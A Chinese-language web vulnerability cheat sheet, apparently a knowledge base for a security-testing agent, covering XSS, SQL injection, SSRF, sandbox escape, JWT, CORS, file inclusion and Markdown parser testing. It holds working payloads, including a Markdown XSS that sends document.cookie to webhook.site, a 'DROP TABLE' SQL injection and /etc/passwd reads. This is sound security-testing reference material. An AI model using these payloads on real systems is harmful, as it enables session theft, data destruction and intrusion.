# Web 漏洞模式速查

> 漏洞模式速查。每个漏洞类型包含：识别方法、利用思路、关键检查点。

---

## 1. 注入类

### 1.1 XSS（跨站脚本攻击）

**本质**：用户输入被浏览器当作代码执行。

**类型**：
| 类型 | 注入位置 | 触发方式 |
|------|---------|---------|
| 反射型 | URL 参数 → 响应 HTML | 用户点击恶意链接 |
| 存储型 | 用户输入存入数据库 → 其他用户页面 | 任何人访问被注入的页面 |
| DOM 型 | JS 从 URL/输入读取 → 写入 DOM | 用户点击恶意链接 |

**识别方法**：
1. 找反射点：用户输入是否出现在响应 HTML 中？
2. 检查转义：`<` → `&lt;`？`"` → `&quot;`？
3. 检查上下文：在 HTML 标签内？属性内？JS 字符串内？URL 内？
4. 检查 CSP：响应头 `Content-Security-Policy` 是否阻止 inline script？
5. 检查 nonce/hash：`<script nonce="xxx">` 是否必须？

**利用思路**：
- HTML 标签内：`<script>alert(1)</script>`
- 属性内：`" onmouseover="alert(1)" `
- JS 字符串内：`';alert(1);//`
- URL 内：`javascript:alert(1)`
- **Markdown 解析器注入**（详见下文 1.1.1）
- 绕过 CSP：详见 `$AGENT_DIR/knowledge-base/csp-bypass.md`

**关键检查点**：
- nonce 机制是否可预测/绕过？
- 输入是否经过多个处理层？每一层可能引入不同的转义行为
- 响应的 Content-Type 是否正确？（`text/html` 浏览器才解析）
- 应用是否使用 Markdown 渲染？Markdown 解析器是否允许 HTML 混合或存在 URL 属性注入？

#### 1.1.1 Markdown 解析器注入

**场景**：应用允许用户提交 Markdown 内容并渲染为 HTML（论坛帖子、评论、个人简介等）。

**为什么 Markdown 是 XSS 风险点**：
1. Markdown 的设计目标就是**生成 HTML**，本质上是"用户输入 → HTML 转换器"
2. 许多 Markdown 解析器支持 HTML 混合模式（Markdown 中直接写 HTML）
3. 即使禁用了 HTML 混合，解析器对特殊语法的处理也可能有边界情况

**常见注入方式**：

| 注入方式 | Payload 示例 | 原理 |
|---------|-------------|------|
| HTML 混合模式 | `<img src=x onerror=alert(1)>` | 解析器直接透传 HTML 标签 |
| 图片 alt 文本 | `![alt"><script>alert(1)</script>](url)` | alt 属性未转义 |
| 链接 title | `[link](url "title"><script>alert(1)</script>)` | title 属性未转义 |
| **URL 属性注入** | `![[x](url1)](url2 onerror=alert(1))` | 嵌套结构导致 URL 后的内容被解析为 HTML 属性 |

**URL 属性注入详解**（SnailNet 案例）：

```markdown
![[x](https://webhook.site/?c=)](https://webhook.site//?dummy onerror=this.src=this.src+document.cookie x=)
```

解析器将这个嵌套结构渲染为：

```html
<img src="https://webhook.site//?dummy" onerror="this.src=this.src+document.cookie" x="">
```

`onerror` 属性被成功注入。当图片加载失败时，JavaScript 执行。

**检查清单**：
1. 确认应用是否使用 Markdown 渲染（查看页面源码，HTML 结构是否有 Markdown 解析器的特征）
2. 测试 HTML 混合模式是否开启（提交 `<b>test</b>` 看是否渲染）
3. 测试标准 Markdown 语法中的边界情况（alt text / title / URL 中的特殊字符）
4. 测试嵌套/不标准的 Markdown 语法（解析器的边界处理通常是弱点）
5. 确认渲染后的 HTML 是否存在 CSP 保护

### 1.2 SQL 注入

**本质**：用户输入被拼入 SQL 查询。

**识别方法**：
1. 输入点在查询参数/POST 表单
2. 输入特殊字符（`'` / `"` / `;`）观察错误/行为变化
3. 布尔盲注：`' AND 1=1--` vs `' AND 1=2--` 看响应差异
4. 时间盲注：`' AND SLEEP(5)--` 看响应延迟

**利用思路**：
- UNION 注入：`' UNION SELECT password FROM users--`
- 堆叠注入：`'; DROP TABLE users--`
- 盲注：逐字符提取数据
- ORM 注入：利用 ORM 的 raw query / 排序参数

### 1.3 SSRF（服务端请求伪造）

**本质**：让服务器发起请求到攻击者指定的地址。

**识别方法**：
1. 功能点：URL 预览、图片加载、Webhook、文件导入
2. 参数值是 URL 或主机名
3. 测试：`http://127.0.0.1` / `http://localhost` / `http://内网IP`

**利用思路**：
- 访问内网服务（元数据 API / 管理面板）
- 读取本地文件（`file:///etc/passwd`）
- 绕过：IP 进制转换 / DNS Rebinding / URL 解析差异

### 1.4 CRLF 注入 / HTTP 头注入

**本质**：用户输入包含 `\r\n`，注入额外的 HTTP 头或响应体。

**识别方法**：
1. 用户输入出现在响应头中（重定向 URL / Set-Cookie / 自定义头）
2. 测试 `%0d%0a`（`\r\n`）是否能注入新头

**利用思路**：
- 注入 `Set-Cookie` 头
- 注入额外的响应头（CSP / CORS）
- HTTP 请求走私（配合反向代理差异）

### 1.5 iframe Sandbox 逃逸

**场景**：页面使用 `<iframe sandbox="...">` 加载用户可控内容，sandbox 限制了 iframe 内 JS 的能力。目标是让恶意 JS 逃出 sandbox 限制，获得完整的浏览器 API 访问权限。

**sandbox 权限标志含义**：

| 标志 | 允许的行为 | 缺失后果 |
|------|-----------|---------|
| `allow-scripts` | 执行 JS | JS 无法运行（最基本，通常存在） |
| `allow-same-origin` | 保留原始 origin | origin 变为 `null`，无法访问 Cookie/localStorage/同源页面 |
| `allow-popups` | `window.open()` | 无法打开新窗口 |
| `allow-popups-to-escape-sandbox` | 新窗口不受 sandbox 限制 | 新窗口也继承 sandbox 限制 |
| `allow-forms` | 提交表单 | 表单提交被阻止 |

**关键认知**：`allow-same-origin` 和 `allow-scripts` 同时存在时，iframe 内 JS 可以移除 sandbox 属性（通过 `frameElement.removeAttribute('sandbox')`），等于没有 sandbox。所以安全配置通常**只给 `allow-scripts`**，这导致 origin 变为 `null`。

#### 逃逸技术 1：blob URL 作为顶级页面加载

**原理**：在 sandboxed iframe 中创建 blob URL，通过 `window.open` 或重定向使 blob URL 成为顶级页面。blob URL 脱离 iframe 后，sandbox 限制消失。

**blob URL 的 origin 继承**：`blob:` URL 继承创建者的 origin。在 sandboxed iframe 中（origin 为 `null`），创建的 blob URL 的 origin 也是 `null`。但如果应用通过其他方式（如 postMessage）将非 null origin 的 blob URL 传递给 iframe，该 blob URL 具有完整的 origin（详见第 7 节"开放重定向"中的 blob URL origin 继承机制）。

**利用步骤**：
1. 在 iframe 中构造恶意 JS payload
2. JS 创建 blob URL（`URL.createObjectURL(new Blob([payload], {type: 'text/html'}))`）
3. 通过 `window.open(blobUrl)` 或 `location.href = blobUrl` 使 blob URL 成为顶级页面
4. 新页面不受 sandbox 限制，可执行完整 JS（访问 Cookie/localStorage 等）

**条件**：sandbox 包含 `allow-popups`（允许 `window.open`）或存在重定向到 blob URL 的路径。

#### 逃逸技术 2：postMessage 传递 blob URL

**原理**：iframe 中的 JS 通过 `postMessage` 将 blob URL 传给外部页面，外部页面构造重定向使 blob URL 成为顶级页面。本节只描述逃逸的利用方式，blob URL 为什么能通过 origin 检查的原理在第 7 节。

**利用步骤**：
1. 在 sandboxed iframe 中构造恶意 JS
2. JS 将 payload 编码为 blob URL
3. 通过 `window.parent.postMessage(blobUrl, '*')` 发送到父页面
4. 父页面接收后，通过 `location.href = blobUrl` 重定向（或构造 `window.open`）
5. blob URL 作为顶级页面加载，sandbox 消失

**识别方法**：
1. 搜索源码中 `<iframe sandbox` 看权限标志组合
2. 检查 `allow-popups` 和 `allow-same-origin` 的存在情况
3. 查看父页面是否有 `postMessage` 监听器 + 重定向逻辑
4. 检查应用是否有 SSO/OAuth 回调中的 `return`/`redirect` 参数（可与 blob URL 组合）

**检查清单**：
- [ ] sandbox 标志中是否包含 `allow-scripts`（无则无法执行 JS，无逃逸可能）
- [ ] 是否有 `allow-popups`（逃逸技术 1 必要条件）
- [ ] 是否有 `allow-same-origin`（同时有 `allow-scripts` 则等于无 sandbox）
- [ ] 父页面是否有 postMessage → location 重定向链路
- [ ] 应用是否有开放重定向（与 blob URL 组合利用，见第 7 节）

---

## 2. 认证/会话类

### 2.1 Cookie 安全

**关键属性检查**：
| 属性 | 作用 | 缺失风险 |
|------|------|---------|
| `HttpOnly` | JS 无法读取 | XSS 可窃取 Cookie |
| `Secure` | 仅 HTTPS 传输 | 中间人可截获 |
| `SameSite` | 跨站请求限制 | CSRF 攻击 |
| `Path` | Cookie 作用路径 | 路径越宽越危险 |
| `Domain` | Cookie 作用域名 | 域名越宽越危险 |

**利用思路**：
- `httpOnly: false` → XSS 可读 Cookie（`document.cookie`）
- `SameSite=None` → 跨站请求带 Cookie（CSRF + 缓存投毒）
- `Path=/` → 所有路径都能访问

### 2.2 JWT（JSON Web Token）

**识别方法**：
1. 认证 Token 格式为 `xxx.yyy.zzz`（Base64 编码的三段）
2. 解码第一段看 `alg` 字段

**常见漏洞**：
| 漏洞 | 检测方法 |
|------|---------|
| `alg: none` | 修改 alg 为 none，删除签名，看是否通过 |
| 弱密钥 | 用 jwt-tool / hashcat 暴力破解密钥 |
| RS256→HS256 混淆 | 用公钥作为 HMAC 密钥签名 |
| kid 注入 | kid 参数注入路径遍历 |

### 2.3 CORS（跨域资源共享）

**识别方法**：
1. 发送 `Origin: https://evil.com` 头
2. 检查响应中 `Access-Control-Allow-Origin` 是否反射
3. 检查 `Access-Control-Allow-Credentials: true`

**利用思路**：
- `ACAO: *` + `ACAC: true` → 任意域读取数据（浏览器实际阻止这种组合）
- `ACAO: https://evil.com` + `ACAC: true` → evil.com 可读取用户数据
- `null` Origin → iframe sandbox 可触发

---

## 3. 缓存类

> 详细分析见 `$AGENT_DIR/knowledge-base/cache-poisoning.md`。

### 3.1 Web Cache Poisoning（缓存投毒）

**核心问题**：攻击者的输入被缓存，其他用户收到被投毒的响应。

**关键检查**：
1. 是否有缓存？（X-Cache 头 / 响应时间差异）
2. 缓存键包含什么？（URL / Host / Vary 头）
3. 攻击者能控制键外的内容吗？（未键入的输入被缓存）

### 3.2 Web Cache Deception（缓存欺骗）

**核心问题**：缓存把包含敏感数据的响应当作静态资源缓存。

**关键检查**：
1. 路径混淆：`/api/user-data/xxx.css` → 缓存认为是 CSS，服务器返回用户数据
2. 缓存规则：只看路径后缀？还是看 Content-Type？

---

## 4. 文件类

### 4.1 LFI/RFI（本地/远程文件包含）

**识别方法**：
1. 参数包含文件路径（`?page=about` / `?file=download`）
2. 测试路径遍历：`../../etc/passwd`

**利用思路**：
- 读取敏感文件（配置/日志/源码）
- 日志注入：在 User-Agent 中注入 PHP 代码，然后包含日志文件
- PHP 协议：`php://filter/convert.base64-encode/resource=index.php`

### 4.2 文件上传

**识别方法**：
1. 文件上传功能点
2. 检查：文件类型限制？文件名处理？存储路径？

**利用思路**：
- 双扩展名：`shell.php.jpg`
- MIME 类型欺骗：修改 Content-Type
- 路径遍历：`../../../var/www/html/shell.php`
- 竞争条件：上传→快速访问→利用

---

## 5. 逻辑类

### 5.1 IDOR（不安全的直接对象引用）

**识别方法**：
1. URL/API 中有 ID 参数（`/api/user/123`）
2. 修改 ID 看能否访问其他用户的数据

**利用思路**：
- 枚举 ID（数字/UUID）
- 批量请求
- 批量 ID 修改

### 5.2 条件竞争

**识别方法**：
1. 功能涉及：余额检查→扣款 / 库存检查→下单 / 优惠券使用
2. 多次并发请求同一操作

**利用思路**：
- 用 Burp Intruder / Python 并发请求
- 时间窗口内的双重使用
- TOCTOU（检查时间/使用时间不一致）

### 1.6 Middleware CT 覆盖漏洞

**场景**：框架中间件（如 Next.js middleware）允许请求中的 `Content-Type` 头覆盖响应的 Content-Type。

**漏洞模式**：

```typescript
// 危险：middleware 允许请求 CT 覆盖响应 CT
const contentType = request.headers.get('content-type');
if (contentType) {
  response.headers.set('Content-Type', processCT(contentType));
}
```

**利用条件**：
1. 应用有中间件处理 CT
2. 中间件允许 `text/html` 作为覆盖值
3. 响应内容中存在未转义的用户输入（如 nonce 反射）

**利用步骤**：
1. 发送请求带 `Content-Type: text/html` 头
2. 同时利用反射点注入 XSS（如通过 `x-nonce` 头注入 `<script>` 标签）
3. 响应 CT 被覆盖为 `text/html`
4. 浏览器将响应内容（可能是 flight data 等非 HTML 格式）当 HTML 解析
5. 未转义的内容中的 `<script>` 标签被执行

**案例**：futurejs 中 Next.js middleware 允许 CT 覆盖，flight data 中未转义的 nonce 值被浏览器当 HTML 解析执行。

**安全写法**：

```typescript
// 安全：白名单验证，禁止覆盖为 text/html
const allowedCTs = ['application/json', 'text/plain'];
const contentType = request.headers.get('content-type');
if (contentType && allowedCTs.includes(contentType.split(';')[0].trim())) {
  response.headers.set('Content-Type', contentType);
}
```

**检查清单**：
- [ ] 搜索 middleware 中的 `Content-Type` 处理逻辑
- [ ] 是否允许请求头覆盖响应 CT？
- [ ] 是否验证 CT 值的白名单？
- [ ] 响应内容中是否有未转义的用户输入？

---

## 6. 反向代理/基础设施类

### 6.1 HTTP 请求走私

**本质**：前端代理和后端服务器对请求边界的解析不一致。

**类型**：
| 类型 | 方式 |
|------|------|
| CL.CL | 两个 Content-Length |
| CL.TE | Content-Length + Transfer-Encoding |
| TE.CL | Transfer-Encoding + Content-Length |
| TE.TE | 两个 Transfer-Encoding（混淆） |

**检测方法**：发送精心构造的请求，观察响应延迟/内容差异。

### 6.2 Host 头攻击

**识别方法**：
1. 修改 Host 头看服务器如何使用
2. 检查：密码重置链接 / 缓存键 / 虚拟主机路由

**利用思路**：
- 密码重置链接中毒
- 缓存投毒（Host 是缓存键的一部分）
- SSRF（Host 被用于反向代理上游请求）

---

## 7. 开放重定向与 URL 验证绕过

**场景**：SSO/OAuth 回调中的 `return`/`redirect` 参数、登录后的跳转 URL 等，服务端通常做 origin 检查，只允许同域跳转。

> SSO 审计的完整攻击编排流程（含 iframe sandbox 逃逸 + blob URL 组合利用），见 `$AGENT_DIR/knowledge-base/attack-orchestration.md` §4。

### 典型验证逻辑

```javascript
// 服务端验证回调 URL 的 origin
const candidate = req.query.return;
if (new URL(candidate).origin === window.location.origin) {
  redirect(candidate);  // 安全？不一定
}
```

### blob URL 绕过（核心）

**关键特性**：`new URL('blob:https://example.com/uuid-1234').origin` 返回 `'https://example.com'`。

blob URL 继承创建者的 origin。当页面 `https://example.com` 上执行 `URL.createObjectURL(blob)` 创建的 blob URL，其 origin 为 `https://example.com`，能通过同域检查。

**利用步骤**：
1. 在目标域上找到可注入 JS 的位置（XSS/Markdown 注入等）
2. 构造恶意页面内容，生成 blob URL
3. 将 blob URL 作为 `return` 参数传递给 SSO/OAuth 回调
4. 服务端验证 `new URL(blobUrl).origin === 'https://example.com'` → **通过**
5. 用户被重定向到 blob URL，恶意 JS 在目标域的 origin 下执行

**与其他漏洞的组合**（与第 1.5 节 sandbox 逃逸的关系）：
- 1.5 节的逃逸技术需要让 blob URL 成为顶级页面来脱离 sandbox
- 本节的开放重定向是"让 blob URL 成为顶级页面"的一种手段
- blob URL 继承创建者 origin 的特性是两者共同的基础

### 其他绕过方式

| 方式 | URL 示例 | `new URL().origin` | 说明 |
|------|---------|-------------------|------|
| `javascript:` | `javascript:alert(1)` | `"null"` | 仅在 `=== null` 比较时可能绕过 |
| `data:` | `data:text/html,<script>alert(1)</script>` | `"null"` | 同上 |
| `@` 混淆 | `https://evil.com@good.com/` | `"https://good.com"` | origin 是 `@` 后的域名 |
| 协议降级 | `http://good.com.evil.com/` | `"http://good.com.evil.com"` | 依赖子域名控制 |

### 识别方法

1. 搜索源码中的 `redirect`、`return`、`callback`、`next` 参数
2. 搜索 `window.location.assign`、`window.location.replace`、`location.href =`
3. 搜索 `new URL(candidate).origin` 检查逻辑
4. 检查 SSO/OAuth 登录流程的回调 URL 处理

### 检查清单

- [ ] 找到所有用户可控的跳转 URL 参数
- [ ] 验证逻辑是否只检查 `origin`（blob URL 可绕过）
- [ ] 是否允许 `javascript:` 或 `data:` 协议
- [ ] 跳转目标是否作为顶级页面加载（sandbox 逃逸的利用路径）
- [ ] **协议白名单**：验证逻辑是否要求协议为 `http:` 或 `https:`（拒绝 `blob:`）
- [ ] **hash 参数**：回调 URL 是否也从 URL hash（`#return=xxx`）中读取（额外的绕过点）

---

## 8. Markdown 解析器安全测试方法论

### 8.1 系统化测试流程

```
阶段 1：基础探测
  ├── 提交纯文本 → 确认渲染正常
  ├── 提交标准 Markdown → 确认语法支持
  └── 检查 HTML 混合模式：提交 <b>test</b> → 是否被渲染为加粗？

阶段 2：HTML 混合模式测试（如果开启）
  ├── <img src=x onerror=alert(1)>  → 直接 XSS
  ├── <script>alert(1)</script>     → 直接 XSS
  └── 如果这里能 XSS，不需要继续测试

阶段 3：标准语法边界测试
  ├── 图片 alt 文本注入：![alt"><script>alert(1)</script>](url)
  ├── 链接 title 注入：[link](url "title"><script>alert(1)</script>)
  ├── 代码块逃逸：```代码块内注入```
  └── 检查每个语法元素是否正确转义特殊字符

阶段 4：嵌套/非标准结构测试（重点！）
  ├── 嵌套方括号：![[x](url1)](url2 extra_attrs)
  ├── 未闭合的方括号/圆括号
  ├── URL 中的空格和特殊字符
  └── 解析器的边界处理通常是弱点

阶段 5：确认 CSP 保护
  ├── 响应中是否有 Content-Security-Policy 头？
  ├── CSP 是否阻止内联脚本和内联事件处理器？
  └── 如果有 CSP，需要结合 CSP 绕过技术
```

### 8.2 常见解析器漏洞模式

| 漏洞 | Payload 示例 | 原因 |
|------|-------------|------|
| URL 属性注入 | `![[x](url1)](url2 onerror=alert(1) x=)` | 解析器把 URL 后的内容当作 HTML 属性 |
| alt 属性注入 | `!["><script>alert(1)</script>](url)` | alt 文本未转义 `"` 和 `<` |
| href 属性注入 | `[link](javascript:alert(1))` | URL 未过滤 `javascript:` 协议 |
| HTML 混合 | `<img src=x onerror=alert(1)>` | 解析器直接透传 HTML |

### 8.3 PHP 自定义 Markdown 解析器特有问题

自定义 Markdown 解析器（非标准库）通常有更多边界问题：

```php
// 典型的有漏洞模式：先全局 htmlspecialchars，再用正则替换
$text = htmlspecialchars($text, ENT_QUOTES, 'UTF-8');  // 转义所有 HTML
$text = preg_replace_callback('/!\[(.*?)\]\((.*?)\)/', function($m) {
    // 正则匹配后再处理，可能引入新的注入点
    $url = safe_markdown_url(htmlspecialchars_decode($m[2])); // 解码后再处理
    return '<img src="' . $url . '" ...>';
}, $text);
```

**关键问题**：`htmlspecialchars_decode` 撤销了之前的转义，然后在正则替换中可能产生新的注入机会。

### 8.4 检查清单

- [ ] 确认 Markdown 渲染功能存在
- [ ] 测试 HTML 混合模式是否开启
- [ ] 测试标准语法中的边界情况
- [ ] **重点测试嵌套/非标准结构**（解析器的最大弱点）
- [ ] 确认渲染后页面的 CSP 保护
- [ ] 如果是自定义解析器，检查源码中是否有 decode→reprocess 模式
